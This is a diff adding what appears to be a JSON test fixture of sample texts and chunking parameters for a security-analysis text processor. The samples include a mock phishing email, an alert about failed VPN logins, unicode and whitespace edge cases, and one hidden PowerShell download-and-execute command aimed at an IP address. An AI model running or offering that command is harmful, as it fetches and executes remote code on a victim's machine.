@@ -1,0 +1,25 @@
+{
+ "texts": [
+  "Suspicious email - DocuSign invoice",
+  "From: billing@docusign-invoices.example\nTo: bob@example.com\nSubject: Your DocuSign invoice is ready\nPlease review and sign the attached invoice before the end of the day. Click the link to view the document.",
+  "powershell.exe -nop -w hidden -enc SQBFAFgA (New-Object Net.WebClient).DownloadString('http://10.20.30.40/a.ps1')",
+  "docusign invoice phishing",
+  "vendor mailer false positive",
+  "confirmed false positive, this is the vendor mailer we whitelisted last month",
+  "https://mfa-reset.example/login?user=bob",
+  "Bob@Example.COM wrote to alice@sub.example.org; see C:\\Users\\bob\\AppData\\evil.exe and /usr/local/bin/tool, hash 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08.",
+  "the and of to",
+  "Ünïcödé naïve café – 東京 2026 résumé.pdf ﬁle",
+  "  leading and trailing space  \n",
+  "200 failed vpn logins from 203.0.113.7 in ten minutes",
+  "x",
+  ""
+ ],
+ "chunks": [
+  {"text": "one two three four five six seven eight nine ten eleven twelve thirteen fourteen fifteen sixteen seventeen eighteen nineteen twenty", "chunk_tokens": 8, "overlap": 2, "max_chunks": 4, "title": "Numbers"},
+  {"text": "one two three four five six seven eight nine ten eleven twelve", "chunk_tokens": 8, "overlap": 2, "max_chunks": 16, "title": null},
+  {"text": "  short text  ", "chunk_tokens": 200, "overlap": 32, "max_chunks": 16, "title": "A title"},
+  {"text": "Ünïcödé naïve café – 東京 2026 résumé.pdf, with more words after it so that there are a few chunks to cut", "chunk_tokens": 6, "overlap": 1, "max_chunks": 16, "title": null},
+  {"text": "   ", "chunk_tokens": 8, "overlap": 2, "max_chunks": 4, "title": "Empty"}
+ ]
+}
